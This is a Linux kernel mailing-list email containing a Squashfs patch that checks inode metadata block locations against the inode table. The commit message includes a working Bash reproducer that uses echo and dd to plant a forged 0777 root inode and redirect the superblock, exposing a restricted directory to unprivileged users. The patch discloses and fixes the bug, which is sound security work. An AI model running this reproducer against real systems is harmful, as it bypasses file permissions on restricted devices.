Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.22
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795571309;
	b=JJeivKn5OAMU7B6lSVYqE993IN4DSVEIv8LqoE1988vrc3qaL+E0f2JFl4ydqrfYWcwa
	 Inhjm3PhZckXqe3FJGPJEN/JlmImAOnFmNLdlKW8PCI2xN2S3Yt5AvHn6IrbQnz2Rsq9N
	 8Yd2QqYqMYqXZDwVy//51Cms/5Huz/8HVZ/CEqxUVm/AxE6TgwCmjvB2ThqdDExx0saXO
	 7JNjAIqrxGejsrdn88JHtJM1w/pUwl8NetG/HSXgz/+JPWpflgh7Yt6xoe7mVTpjOCgk3
	 iT0Q4wYhnevl3qgd27GArDaNYaMWkH0H1dGI6XKCXA4xyxN3i7kpyz75tkVnJ9eDynw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795571309;
	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
	 X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding:X-CMAE-Envelope;
	bh=INo9YYRLnVEELlFzGMTYteCHo9WPehUMmcr0DiEAWqQ=;
	b=ufvgVKltP8XvT8H+pMXIRy4XbW4iNq4qVw4MqkD0mluyApCEt66Qb5U21yVVbVxVBYQ5
	 C6i0hdE539DLbHS0pPIv/DVTNX1es/R98KLHYCMaZ0TZhq6vj+1NfeHcAPoDtRMLeSTqd
	 19DrRZTcRlUjU3GczruFJRdAsgaHgBkkLvjQWFTIIRQWiWo4LNZKUHNB15qL7hYzol8CC
	 kE7LjoZnGfh0S7y+rJBUtQw/tVsILW+wpA/C8sIhZoilBhW4jXfKwyRxSY4GEfHz3lc5o
	 KBreAY6rkXJJju+R4FWzq5AvG3iLbSVDdzuw6ogKfQUAzYA2o+KxQ/fV0HmamgoGwLQ==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=squashfs.org.uk;
	spf=pass smtp.mailfrom=squashfs.org.uk;
	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b="JTkOd24/";
	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=Alq3X1DX;
	arc=none smtp.remote-ip=188.121.53.22
Received: from sxplsmtpa04-02.prod.sxb1.secureserver.net (sxplsmtpa04-02.prod.sxb1.secureserver.net [188.121.53.22])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4357F606A6A3
	for <linux-kernel@vger.kernel.org>; Wed, 25 Nov 2026 01:48:28 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 4357F606A6A3
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=JTkOd24/;
	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=Alq3X1DX
Received: from avalon.fritz.box ([82.69.79.175])
	by :SMTPAUTH: with ESMTPA
	id W26zxdCHW8H3GW27QxX8Nl; Wed, 25 Nov 2026 01:48:21 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
	s=secureserver2; t=1795571302;
	bh=INo9YYRLnVEELlFzGMTYteCHo9WPehUMmcr0DiEAWqQ=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=JTkOd24/OByCR9WdbiF2FIXhR8yNBL5l9BdzuqpM3ICbovDTDoYoCpkUjTiEeSdrU
	 16C3BZadFUMEI03yoglMHfqKrtaazojpgYs6QOvUAnBoxIJXNXzla4W6UjGgEIFvjy
	 wT1dAUhc5wU3l6ACGMgv8QEZTLK/TZuB/lENu2XoWaFgPrCDTdMChZuVJ4Xrc0Wdfu
	 hwrhOABmQVgWntnVVMp4qVTm2pdIqLjDZvqjqTQNZCKgL6iICzeijk8d1nOB/X5Ixw
	 z5GP9KpPpf1iy0PesUzHMe/CepELfOflKObLzsEwmdxOsEDhZgoFQoGdbEUcXeZ/Cb
	 Qx4Zlb9dOntsg==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
	s=secureserver1; t=1795571302;
	bh=INo9YYRLnVEELlFzGMTYteCHo9WPehUMmcr0DiEAWqQ=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=Alq3X1DXfy8H9ngUOToIkR/FXUFQLQos4B+gwrNNV/LFBAQAy91UNryFzQS5M1DP3
	 5oq9VhDE1LsWpHZK3xnj8gUM3ytl7MEUo/N6bxKxp0sSqPvqy1BIqzJZh9raCCnHiT
	 PfBHhSAkWQclM759kokL050HJzCQ03fDH3wqFaiIL+ejxFz7u4Uoo/VTCQa9whzidd
	 F/ulPyhY99GJBv81gHhfgtLZsMXyuTNRNBDxRh48IbOGLgkgtXuA40nsJTtxPs/bbe
	 DWZNcxoVMbFr8Cm2mJem43II5IIkaLMqvku+k5GBjeIzHZmzsCm0t1s55VahJcE4cR
	 wy2QgwiUToe+w==
X-CMAE-Analysis: v=2.4 cv=Cuoq4X4D c=1 sm=1 tr=0 ts=6b063e65
 a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
 a=WbH0joDL9KXNTEjrqjoA:9 a=UObqyxdv-6Yh2QiB9mM_:22
Feedback-ID: c56962604e5c144112d7667a87df022f:squashfs.org.uk:ssnet
X-SECURESERVER-ACCT: phillip@squashfs.org.uk
From: Phillip Lougher <phillip@squashfs.org.uk>
To: akpm@linux-foundation.org,
	linux-kernel@vger.kernel.org
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Subject: [PATCH v4 11/23] Squashfs: sanity check inode metadata block location
Date: Wed, 25 Nov 2026 01:47:25 +0000
Message-ID: <20261125014737.347231-12-phillip@squashfs.org.uk>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <20261125014737.347231-1-phillip@squashfs.org.uk>
References: <20261125014737.347231-1-phillip@squashfs.org.uk>
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CMAE-Envelope: MS4xfOXlQI7yRiQTnwexaWoR3b1FVrRUstEBx6F6uznduTzoycJwS2OXHdIYeO8miFpZHpfSClccwXUoFsrtOSNxMEul9PDuznwJxcTKLakRgCGJ9JAVGU+6
 MdCZrfr392XMpKOtHfJqKxoivJ1TSq/J+dVjTtWDECO7cfAAIsNjOUQKI27wT7H8yihWcM5GCmCCvLWr617mBmiX71mnSRVrwE0JnONdweyCwE/OSiAt4d2Z
 zqvJNBB17p1EoGSKWNmzzmGoEReknwq+KmkWL2c2cSk9mCrbYDKth4D5ZFzu/6sS

An inode reference in Squashfs is represented as a tuple, the location
of the compressed metadata block the inode is in, and the offset into
the uncompressed block.  The location is not absolute and it is instead
encoded as an offset from the start of the inode table.

An attacker could manipulate the inode reference to make it point to a
replacement malicious inode stored elsewhere, outside the inode table.
This is because the code does not check that the location is valid and
is within the inode table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to hide a malicious inode.

Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliberately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem root directory has
permissions 0700 (u=rxw), where only the superuser can enter the
directory and access the content within. But using this bug an attacker
could place a malicious root inode in the inode lookup table (used by
NFS) which has the permissions changed to 0777 (a=rwx), and then update
the root_inode field in the superblock to point to that.  On
reboot/remount this will make the directory accesisible to unprivileged
users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_inode_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the inode is within the inode table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the root directory
permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
is unchanged.

======================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
for i in $(seq 1 100); do
	echo "$i l zero" >> pseudo
done

# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# The root_inode field in the superblock points to the compressed metadata
# block and offset within it, where the root inode is stored.
#
# Create a malicious root inode and hide it in the inode lookup table.
# Because of mount time checking, there are no gaps between metadata tables
# where it can be hidden, and it can't be hidden after the file system end,
# because this is checked.

# Write malicious inode, this is the same as the original root inode, except
# it is uncompressed, and the permissions are set to 0777.
/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
\x00" > file

# Place new root inode inside the inode lookup table
echo Place new root inode inside the inode lookup table

dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new inode
# The start block is an offset from the inode_table_start, and not an
# absolute value.  The start of the inode table is 113, the new inode
# is placed at position 964, and so the offset is 851. Because we've only
# stored one inode in the metadata block, the offset into that block is 0.
#
echo Update the root_inode field in the superblock to point to our new inode

/usr/bin/echo -en "\x00\x00\x4f\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt, if the exploit is successful, permissions should be 0777
echo Stat /mnt, if the exploit is successful, permissions should be 0777

stat /mnt

popd 2>&1> /dev/null

rm -rf $DIR
======================================================================

Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
---
v3:
  - Change sanity check to ensure start isn't equal to directory table
    (start >= msblk->directory_table).
v2:
  - Ensure err is not used uninitialised.
---
 fs/squashfs/inode.c            | 17 ++++++++++-------
 fs/squashfs/squashfs_helpers.h | 18 ++++++++++++++++++
 2 files changed, 28 insertions(+), 7 deletions(-)

diff --git a/fs/squashfs/inode.c b/fs/squashfs/inode.c
index 96b5b9c336dd..7c262be4a644 100644
--- a/fs/squashfs/inode.c
+++ b/fs/squashfs/inode.c
@@ -109,8 +109,8 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 {
 	struct super_block *sb = inode->i_sb;
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	u64 block = squashfs_inode_blk(ino) + msblk->inode_table;
-	int offset = squashfs_inode_offset(ino);
+	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
+	int offset = squashfs_inode_offset(ino), soffset = offset;
 	int err, type;
 	union squashfs_inode squashfs_ino;
 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
@@ -118,11 +118,14 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 
 	TRACE("Entered squashfs_read_inode\n");
 
+	if (block < 0)
+		goto bad_block_val;
+
 	/*
 	 * Read inode base common to all inode types.
 	 */
-	err = squashfs_read_metadata(sb, sqshb_ino, &block,
-				&offset, sizeof(*sqshb_ino));
+	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
+				&soffset, sizeof(*sqshb_ino));
 	if (err < 0)
 		goto failed_read;
 
@@ -130,9 +133,6 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 	if (err)
 		goto failed_read;
 
-	block = squashfs_inode_blk(ino) + msblk->inode_table;
-	offset = squashfs_inode_offset(ino);
-
 	type = le16_to_cpu(sqshb_ino->inode_type);
 	switch (type) {
 	case SQUASHFS_REG_TYPE: {
@@ -464,6 +464,9 @@ int squashfs_read_inode(struct inode *inode, long long ino)
 
 	return 0;
 
+bad_block_val:
+	err = block;
+
 failed_read:
 	ERROR("Unable to read inode 0x%llx\n", ino);
 	return err;
diff --git a/fs/squashfs/squashfs_helpers.h b/fs/squashfs/squashfs_helpers.h
index 524d4a77686d..662ebf464d3c 100644
--- a/fs/squashfs/squashfs_helpers.h
+++ b/fs/squashfs/squashfs_helpers.h
@@ -47,6 +47,24 @@ static inline u16 squashfs_inode_offset(s64 inode)
 	return inode & 0xffff;
 }
 
+static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
+{
+	s64 start;
+
+	if (inode < 0)
+		return -EINVAL;
+
+	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
+		return -EINVAL;
+
+	start = msblk->inode_table + squashfs_inode_blk(inode);
+
+	if (start >= msblk->directory_table)
+		return -EINVAL;
+
+	return start;
+}
+
 static inline s64 squashfs_mkinode(u32 start, u16 offset)
 {
 	return ((s64)start << 16) | offset;
-- 
2.47.3

